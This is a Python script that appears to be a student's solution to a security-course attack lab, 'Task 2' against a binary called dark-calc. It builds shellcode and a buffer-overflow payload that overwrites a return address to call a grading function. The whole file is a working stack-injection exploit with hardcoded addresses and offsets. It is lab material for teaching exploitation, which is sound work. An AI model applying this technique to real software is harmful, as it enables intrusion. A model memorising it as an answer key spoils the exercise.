#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (stack execution).

dark-calc maps its stack at a fixed, executable address
(fixed_stack_top = 0x721000801000), so we inject shellcode into the
gets() buffer (at 0x721000800fd0) and overwrite the return address with
that buffer address.

Shellcode calls grade_eval(4), which prints "Hope A will be your grade!":
    mov edi, 4            bf 04 00 00 00
    mov eax, 0x401a87     b8 87 1a 40 00
    call rax              ff d0
    ret                   c3
"""
import struct
import sys

grade_eval = 0x401A87
buf_addr = 0x721000800FD0  # fixed stack buffer address (expression)
offset_to_ret = 24

shellcode = b"\xbf\x04\x00\x00\x00"      # mov edi, 4
shellcode += b"\xb8\x87\x1a\x40\x00"     # mov eax, grade_eval
shellcode += b"\xff\xd0"                  # call rax
shellcode += b"\xc3"                      # ret

payload = shellcode + b"\x90" * (offset_to_ret - len(shellcode)) \
    + struct.pack("<Q", buf_addr)

sys.stdout.buffer.write(payload + b"\n")
